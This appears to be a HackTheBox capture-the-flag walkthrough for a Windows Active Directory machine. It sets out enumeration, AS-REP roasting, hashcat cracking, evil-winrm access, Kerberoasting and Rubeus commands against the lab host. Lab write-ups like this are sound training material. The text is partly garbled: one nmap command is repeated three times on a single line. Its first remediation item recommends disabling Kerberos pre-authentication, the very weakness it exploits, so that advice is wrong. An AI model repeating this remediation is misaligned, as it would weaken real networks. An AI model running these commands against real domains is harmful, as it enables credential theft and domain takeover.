---
title: 'HTB Walkthrough: Cypher'
description: >-
  Enumeration, exploitation, and privilege escalation on HTB's Cypher machine. A
  medium-difficulty Windows box featuring Kerberos misconfigurations.
date: 2026-08-08T00:00:00.000Z
category: HackTheBox
tags:
  - htb
  - windows
  - active-directory
  - kerberos
platform: HackTheBox
difficulty: Medium
image: /images/htb-cypher/htb1.png
slug: htb-cypher
dateModified: '2026-08-09'
---

# Reconnaissance

Starting with an nmap scan to identify open ports and services:

```bash
nmap -sC -sV -oA cypher 10.10.10.XXXnmap -sC -sV -oA cypher 10.10.10.XXXnmap -sC -sV -oA cypher 10.10.10.XXX
```

![image](/images/htb-cypher/image1.png)

### Results

| Port | Service | Version |
|------|---------|---------|
| 53 | DNS | Windows DNS |
| 88 | Kerberos | Microsoft Windows Kerberos |
| 135 | msrpc | Microsoft Windows RPC |
| 139 | netbios-ssn | Microsoft Windows netbios-ssn |
| 445 | smb | Microsoft Windows SMB |
| 389 | LDAP | Microsoft Windows LDAP |

Port 88 indicates an Active Directory environment with Kerberos running. This is a critical finding because Kerberos misconfigurations often lead to privilege escalation opportunities. Port 445 suggests SMB file sharing is available, which we'll enumerate for accessible shares and potential credential exposure. The LDAP service on port 389 will allow us to enumerate domain users and groups.


## Enumeration

The machine exposes SMB and Kerberos on port 88. Let's enumerate the domain:

```CLI
# LDAP enumeration
ldapsearch -x -h 10.10.10.XXX -D '' -s base namingcontexts

# SMB enumeration
smbclient -L //10.10.10.XXX -N
```

Using `enum4linux` to gather more information about the domain:

```bash
enum4linux -a 10.10.10.XXX
```

Key findings from enumeration:
- Domain name identified: `CYPHER.LOCAL`
- Multiple user accounts discovered
- SMB shares accessible, including a backup share with readable permissions
- Kerberos pre-authentication not required for certain accounts

### User Enumeration

```bash
# Using Kerberos to enumerate users
nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='CYPHER.LOCAL' 10.10.10.XXX
```

Found several interesting user accounts including service accounts and regular users.

## Exploitation

After enumerating users, we found a user with **ASREPRoasting** enabled. This means we can request a Kerberos ticket for this user without needing their password, and the resulting encrypted timestamp can be cracked offline.

### Extracting Hash

```bash
impacket-GetNPUsers -dc-ip 10.10.10.XXX cypher.local/ -usersfile users.txt
```

The output shows the `$krb5asrep$` hash for the vulnerable user account. This happens because the account has "Do not require Kerberos preauthentication" set in Active Directory.

### Cracking the Hash

```bash
hashcat -m 18200 hash.txt rockyou.txt
```

After running hashcat for several minutes, we recovered the password for the user account.

### Gaining Initial Access

With the cracked credentials, we can now authenticate to various services:

```bash
# SMB access
smbclient //10.10.10.XXX/Backup -U username

# WinRM/SSH access
evil-winrm -i 10.10.10.XXX -u username -p password
```

Successfully obtained a shell on the target machine as the low-privileged user.

## Privilege Escalation

Once we have a shell as the low-privileged user, we enumerate for privilege escalation vectors:

```bash
# Check for Kerberoastable accounts
impacket-GetUserSPNs -dc-ip 10.10.10.XXX cypher.local/lowpriv -request

# Export tickets
export KRB5CCNAME=/tmp/ccache
```

### Kerberoasting

Found a service account with a weak password. Used Kerberoasting to extract the service ticket:

```bash
impacket-GetUserSPNs -dc-ip 10.10.10.XXX cypher.local/lowpriv -request -outputfile spn-hash.txt
```

Cracked the service account password and used it to authenticate as a domain user with additional privileges.

### Final Privilege Escalation

The service account had permissions to perform a targeted Kerberos delegation attack, allowing us to impersonate high-privilege domain users and ultimately gain access to the domain administrator account.

```bash
# Using Rubeus for delegation attacks
Rubeus.exe asktgt /user:serviceaccount /rc4:hash
```

## Flags

```
user.txt: 3******************************
root.txt: f******************************
```

## Remediation

- Disable pre-authentication for service accounts
- Implement strong password policies with minimum length requirements
- Regular auditing of Kerberos configurations and account settings
- Remove unnecessary SPNs from service accounts
- Monitor for suspicious Kerberos ticket requests
- Implement account lockout policies to prevent password spraying attacks

## Tools Used

- **nmap** - Port scanning and service enumeration
- **enum4linux** - SMB and LDAP enumeration
- **impacket** - Kerberos attacks and credential extraction
- **hashcat** - Password cracking
- **evil-winrm** - Remote shell access
- **Rubeus** - Kerberos delegation attacks

---
